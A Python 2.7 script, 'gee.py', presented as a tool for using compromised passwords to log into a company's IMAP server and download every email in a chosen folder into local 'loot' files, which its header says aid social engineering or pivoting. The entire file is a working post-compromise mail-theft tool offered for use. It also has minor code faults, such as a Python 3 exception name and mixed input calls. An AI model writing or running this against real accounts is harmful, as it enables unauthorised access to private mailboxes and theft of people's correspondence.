#!/usr/bin/env python
#
# Script name     : gee.py
# Version         : 1.0
# Created date    : N/A
# Last update     : N/A
# Author          : Milton Valencia (wetw0rk)
# Python version  : 2.7
# Description     : If a company has an imap server and you have compromised passwords
#                   see what the user likes etc; may aid in social engineering or pivoting.
#                   Extracts all emails to text files
#

import os, sys, pprint, getpass

# Check for uncommon modules
try:
	import imapclient
except:
	ans = raw_input("[+] imapclient not installed. Install [Y/N]: ")
	if ans == 'Y':
		os.system("pip install imapclient")
try:
	import pyzmail
except:
	ans = raw_input("[+] pyzmail not installed. Install [Y/N]: ")
	if ans == 'Y':
		os.system("pip install pyzmail")

def usage():

	print("    ____  U _____ uU _____ u ")
	print(" U / ___|u\| ___-|/\| ___-|/ ")
	print(" \| |  _ / |  _|    |  _|  ")
	print("  | |_| |  | |___   | |___ ")
	print("   \____|  |_____|  |_____| ")
	print("   _)(|_   <<   >>  <<   >> ")
	print("  (__)__) (__) (__)(__) (__)")
	print("    Good  Email  Extractor ")
	print("\nUsage: <imap_server> <email_address>")

try:
	imap_server	= sys.argv[1]
	email_address	= sys.argv[2]
	password	= getpass.getpass()

except IndexError:
	usage()
	sys.exit(1)

# Login to imap client
imap_object = imapclient.IMAPClient(imap_server, ssl=True)
imap_object.login(email_address, password)

# List Email Folders
print("[+] Listing Email Folders")
pprint.pprint(imap_object.list_folders())
folder = input("[+] Select Folder: ")
imap_object.select_folder(folder, readonly=True)

# Search For All Emails In Given Folder
print("[+] Searching for all emails in " + folder)
amount_of_emails = len(imap_object.search(['ALL']))
print("[+] " + str(amount_of_emails) + " emails found in " + folder)
UIDS = imap_object.search(['ALL'])
amount_of_uids = len(UIDS)
raw_messages = imap_object.fetch(UIDS, ['BODY[]'])

# Ask To Download All Emails
answer = raw_input("[+] Want me to grab all emails? (y/n): ")
if answer == 'y':
	try:
		print("[+] Saving Extracted Emails To Emails_Extracted Folder")
		os.mkdir("Emails_Extracted")

	except FileExistsError:
		pass

	os.chdir("Emails_Extracted")


	# For Every Email We Will Create A Text File Containing Email Contents
	for i in range(amount_of_uids):
		message = pyzmail.PyzMessage.factory(raw_messages[int(UIDS[i])][b'BODY[]'])
		try:
			message_as_text = str(message)
			name_of_email_file = "email_" + str(i)
			sys.stdout.write("\r[+] Downloading Email " + str(i))
			sys.stdout.flush()
			loot_file = open(name_of_email_file, "w")
			loot_file = open(name_of_email_file, "a")
			loot_file.write(message_as_text)

		except KeyError:

			print("\n[-] We Encountered An Error")
			continue

	print("\n[+] Emails Downloaded")
else:
	print('[-] Exiting')

